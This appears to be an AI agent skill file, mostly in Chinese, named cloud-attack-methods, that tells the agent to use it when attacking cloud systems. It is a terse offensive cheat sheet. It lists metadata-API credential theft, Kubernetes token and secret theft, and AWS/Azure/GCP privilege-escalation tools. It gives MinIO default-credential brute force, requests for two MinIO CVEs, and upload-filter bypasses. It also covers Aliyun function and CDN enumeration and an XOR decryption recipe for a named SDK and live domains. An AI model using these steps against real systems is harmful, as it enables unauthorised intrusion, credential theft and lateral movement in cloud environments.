---
name: cloud-attack-methods
description: >-
  云攻击:元数据API,S3/K8s,AWS/Azure/GCP身份提权,MinIO矩阵,阿里云FC,ChengZi SDK解密。Use when attacking cloud metadata, IAM, K8s, MinIO, Aliyun FC, or cloud post-ex.
metadata:
  tags: [渗透测试, penetration-testing, 红队]
---

## 云攻击手法

```
=== 云 ===
元数据API: AWS 169.254.169.254/latest/meta-data/iam/ | Azure -H Metadata:true | GCP metadata.google.internal | 阿里云100.100.100.200
对象存储: aws s3 ls --no-sign-request | K8s: /var/run/secrets/.../token → api/v1拿secrets/exec pods → cluster-admin
🚨云身份攻击(拿到key/token后的提权横向):
  AWS: enumerate-iam/cloudfox/ScoutSuite枚举权限 → pacu自动找privesc(iam:PassRole+lambda/ec2/glue等18+条) | STS AssumeRole跨账户 | Lambda环境变量偷密钥
  Azure/Entra: roadtools(roadrecon dump租户)/AADInternals | 设备码/刷新令牌 | Managed Identity IMDS偷token | Automation Runbook RCE | Key Vault读密钥
  Entra后渗透: GraphRunner(Graph API枚举/搜邮件/加后门App) | 服务主体加凭据(隐蔽持久化) | 动态组滥用 | PRT偷取横向
  GCP: 服务账户token(metadata) | serviceAccountTokenCreator/actAs提权 | gcloud枚举
🚨K8s深入(拿到集群网络/pod): kubelet 10250未授权(/pods列举,/exec进任意容器) | etcd 2379无认证读全secrets | API Server匿名 | RBAC过权SA(kubectl auth can-i --list) | 特权pod挂宿主逃逸 | 云K8s抢node身份→IMDS
🚨MinIO攻击矩阵:
  指纹: Server: MinIO | /minio/health/live → 200(空body) | /minio/health/cluster → 200 | 9000(API)+9001(Console)
  Console爆破: POST http://IP:9001/api/v1/login body={"accessKey":"minioadmin","secretKey":"minioadmin"} | 403="invalid Login"
  STS API: POST /?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&WebIdentityToken=JWT → 需JWT provider配置
  CVE-2023-28432: POST /minio/health/cluster?verify (信息泄露,返回环境变量含MINIO_SECRET_KEY)
  CVE-2023-28434: 路径穿越 /bucket/..%2F..%2Fetc/passwd → XMinioInvalidResourceName(已修补则不可用)
  匿名访问: GET /bucket-name/ → ListBucket(200)=匿名读 | PUT /bucket/file → AccessDenied(403)=匿名写被禁
  上传绕过: 应用层sign验证dir参数但不校验→可写任意bucket(sign只校验cid+et+og不含dir)
  扩展名绕过: .jsp;.jpg / .jsp%00.jpg 过应用黑名单但MinIO存储为静态文件(image/jpeg)不执行
🚨阿里云FC函数(fcapp.run)枚举:
  识别: URL含 *.cn-{region}.fcapp.run → 阿里云函数计算(Serverless)
  特征: POST返回"unauthorized method 'POST'"(405) = 只接受GET | 200+{"code":200,"msg":"Forbidden"} = 路径存在但缺参数
  利用: GET /{path}/{id}.html → 302重定向泄露真实CDN域名+auth_key签名URL(暴露CDN域名/bucket结构/签名算法)
  枚举: 不同路径前缀对应不同APP(/mkzavakx/ vs /kpqwbcoq/) | 无效ID→302到qzone.qq.com/404.html(fallback)
  路径穿越: FC正确规范化(../无效),但可枚举不同function路径
  CDN auth_key(昆仑CDN kunlunaq.com): format=timestamp-rand-uid-md5(uri-timestamp-rand-uid-privatekey) → 破解需privatekey | x-tengine-error暴露"denied by req auth"
  FC→CDN链路: FC函数生成签名URL→kunlun/kijwsks.com CDN下载 | referer伪装百度(mo.baidu.com)
🚨橙子建站(ChengZi SDK)解密:
  初始化: POST https://random.d3504.cn/init3 body={appkey,channelCode,...} → 加密响应(base64)
  解密: 单字节XOR key=0x96 → JSON(channelCode/fu下载URL/csu跟踪URL/ph安装包hash)
  d3504.cn通过Cloudflare+阿里云DDoS防护(aliyunddos)+昆仑CDN(kunlunaq.com) → 多层防护
  关键: fu字段=真实APK下载FC函数URL(可能与落地页不同region!) | csu=点击跟踪回调URL
```
